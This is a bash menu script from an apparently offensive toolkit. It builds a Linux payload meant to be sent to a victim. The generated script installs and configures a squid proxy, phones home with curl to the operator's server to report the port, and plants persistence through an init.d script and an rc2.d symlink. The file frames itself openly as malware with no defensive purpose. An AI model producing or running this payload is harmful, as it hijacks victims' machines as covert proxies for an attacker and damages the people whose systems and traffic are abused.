clear
while :
do
echo ""
echo "Proxy"
echo "--------------------------------------"
echo ""
echo "  1.- Use Victim As Proxy (With Malware Only for Linux)"
echo ""
echo "  99.- Exit"
echo "--------------------------------------"
echo -n "Select an option [Proxy]> "
read op3
case $op3 in
1) echo "[*] Selected: Proxy";
echo -n "Path to save the Payload [Proxy]> "
read pth666
echo -n "Name for the Payload [Proxy]> "
read name6667
echo "[*] Server used to send Proxy Data: $(cat config/server.txt)"
mkdir $pth666/$name6667
echo "apt-get install squid3
apt install squid3
cp config.conf /etc/squid/squid.conf
/etc/init.d/squid start
curl $(cat config/server.txt)?port=3128
chmod 777 $name6667.sh
echo '#!/bin/bash
/etc/init.d/squid start' > /opt/linux000.sh
chmod 777 /opt/linux000.sh
echo '#!/bin/sh 
      cd /opt
      sh linux000.sh
      exit' > linux000.sh
cp linux000.sh /etc/init.d/linux000.sh
rm linux000.sh
chmod 777 /etc/init.d/linux000.sh
ln -s /etc/init.d/linux000.sh /etc/rc2.d/S88linux000
" > $pth666/$name6667/$name6667.sh
cp config/config.conf $pth666/$name6667/config.conf
echo "[+] GENERATED IN: $pth666/$name6667 NOW COMPRESS IT AND SEND IT TO VICTIM AND A PROXY SERVER WILL BE CONFIGURED!";
;;
99) echo "[*] Exiting...";
exit 1;;
*) echo "[!] $op3 is not a valid option.";
echo "Press enter to continue...";
read foo;;
esac
done
